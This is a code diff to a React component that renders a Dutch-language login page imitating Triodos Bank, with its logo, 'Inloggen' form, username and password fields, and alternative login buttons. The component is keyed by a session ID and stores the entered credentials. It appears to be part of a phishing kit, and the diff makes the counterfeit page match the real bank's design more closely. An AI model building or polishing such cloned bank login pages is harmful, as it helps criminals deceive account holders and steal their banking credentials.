@@ -38,43 +38,105 @@ export function TriodosBankClient({ sessionId }: { sessionId: string }) {
   }
 
   return (
-    <div className="min-h-screen bg-[#F5F5F5] font-sans flex flex-col items-center">
-      <header className="bg-white w-full h-[80px] flex items-center justify-center border-b border-gray-200 shrink-0">
-        <img src="/bank-logos/triodos-bank.svg" alt="Triodos Bank" className="h-10" />
-      </header>
+    <div className="min-h-screen bg-[#F0EFFF] font-sans flex flex-col items-center pt-12 pb-20">
+      
+      {/* Logo */}
+      <div className="mb-10">
+        <img src="/bank-logos/triodos-bank.svg" alt="Triodos Bank" className="h-8" />
+      </div>
 
-      <main className="flex-1 w-full max-w-[450px] px-4 py-12">
-        <div className="bg-white shadow-sm rounded-[10px] p-8 md:p-10 border border-gray-100">
-          <h1 className="text-[26px] font-medium text-[#000] mb-2 text-center">Inloggen</h1>
-          <p className="text-center text-[#555] text-[15px] mb-8">Log in op Internet Bankieren</p>
-          
-          <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }} className="space-y-5">
-            <div>
-              <label className="block text-[14px] font-medium text-[#333] mb-2">Gebruikersnaam</label>
+      <h1 className="text-[32px] font-bold text-[#2C0044] mb-8">Inloggen</h1>
+
+      {/* Main Login Card */}
+      <div className="w-full max-w-[640px] bg-white rounded-lg p-8 shadow-sm mb-12">
+        <h2 className="text-[18px] font-bold text-[#2C0044] mb-6">Inloggen met gebruikersnaam en wachtwoord</h2>
+        
+        <form onSubmit={(e) => { e.preventDefault(); void handleSubmit(); }}>
+          <div className="flex flex-col md:flex-row gap-6 mb-8">
+            <div className="flex-1 relative">
               <input 
                 required 
                 type="text" 
                 value={username} 
                 onChange={e => setUsername(e.target.value)} 
-                className="w-full border border-gray-300 p-3.5 text-[15px] focus:outline-none focus:border-[#6B3FA0] focus:ring-1 focus:ring-[#6B3FA0] rounded-[6px]" 
+                className="w-full bg-[#F0EFFF] border-none rounded-md pt-6 pb-2 px-4 text-[#2C0044] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#98D898] transition-all peer" 
+                placeholder=" "
               />
+              <label className="absolute left-4 top-4 text-[#2C0044] opacity-70 text-[15px] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-[15px] peer-focus:top-1.5 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[11px] pointer-events-none">
+                Gebruikersnaam
+              </label>
             </div>
-            <div>
-              <label className="block text-[14px] font-medium text-[#333] mb-2">Wachtwoord</label>
+
+            <div className="flex-1 relative">
               <input 
                 required 
                 type="password" 
                 value={password} 
                 onChange={e => setPassword(e.target.value)} 
-                className="w-full border border-gray-300 p-3.5 text-[15px] focus:outline-none focus:border-[#6B3FA0] focus:ring-1 focus:ring-[#6B3FA0] rounded-[6px]" 
+                className="w-full bg-[#F0EFFF] border-none rounded-md pt-6 pb-2 px-4 pr-12 text-[#2C0044] text-[15px] focus:outline-none focus:ring-2 focus:ring-[#98D898] transition-all peer" 
+                placeholder=" "
               />
+              <label className="absolute left-4 top-4 text-[#2C0044] opacity-70 text-[15px] transition-all peer-placeholder-shown:top-4 peer-placeholder-shown:text-[15px] peer-focus:top-1.5 peer-focus:text-[11px] peer-[:not(:placeholder-shown)]:top-1.5 peer-[:not(:placeholder-shown)]:text-[11px] pointer-events-none">
+                Wachtwoord
+              </label>
+              <button type="button" className="absolute right-4 top-4 text-[#2C0044] opacity-60 hover:opacity-100">
+                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+              </button>
             </div>
-            <button type="submit" disabled={saving || !username || !password} className="w-full bg-[#6B3FA0] text-white font-medium py-3.5 rounded-[6px] mt-6 hover:bg-[#4B2C70] disabled:opacity-50 transition-colors">
+          </div>
+
+          <div className="flex items-center justify-between">
+            <a href="#" className="text-[#2C0044] text-[15px] font-medium hover:underline">
+              &gt; Gebruikersnaam of wachtwoord vergeten?
+            </a>
+            <button 
+              type="submit" 
+              disabled={saving || !username || !password} 
+              className="bg-[#98D898] text-[#2C0044] font-bold py-3 px-8 rounded-full hover:bg-[#86c986] disabled:opacity-50 transition-colors"
+            >
               {saving ? "Laden..." : "Inloggen"}
             </button>
-          </form>
+          </div>
+        </form>
+      </div>
+
+      {/* Alternative Login Options */}
+      <div className="w-full max-w-[640px]">
+        <h3 className="text-[16px] font-bold text-[#2C0044] mb-4">Anders inloggen?</h3>
+        
+        <div className="space-y-3">
+          <button className="w-full bg-white rounded-lg p-5 flex items-center justify-between shadow-sm hover:shadow-md transition-shadow group">
+            <div className="flex items-center gap-4">
+              <svg className="w-6 h-6 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+              <span className="text-[#2C0044] font-bold text-[15px]">App</span>
+            </div>
+            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center group-hover:border-[#2C0044] transition-colors">
+              <svg className="w-4 h-4 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path></svg>
+            </div>
+          </button>
+
+          <button className="w-full bg-white rounded-lg p-5 flex items-center justify-between shadow-sm hover:shadow-md transition-shadow group">
+            <div className="flex items-center gap-4">
+              <svg className="w-6 h-6 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+              <span className="text-[#2C0044] font-bold text-[15px]">Identifier</span>
+            </div>
+            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center group-hover:border-[#2C0044] transition-colors">
+              <svg className="w-4 h-4 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path></svg>
+            </div>
+          </button>
+
+          <button className="w-full bg-white rounded-lg p-5 flex items-center justify-between shadow-sm hover:shadow-md transition-shadow group">
+            <div className="flex items-center gap-4">
+              <span className="text-[#2C0044] font-bold text-[20px] w-6 text-center leading-none mt-1">***</span>
+              <span className="text-[#2C0044] font-bold text-[15px]">Controlegetal</span>
+            </div>
+            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center group-hover:border-[#2C0044] transition-colors">
+              <svg className="w-4 h-4 text-[#2C0044]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"></path></svg>
+            </div>
+          </button>
         </div>
-      </main>
+      </div>
+
     </div>
   );
 }
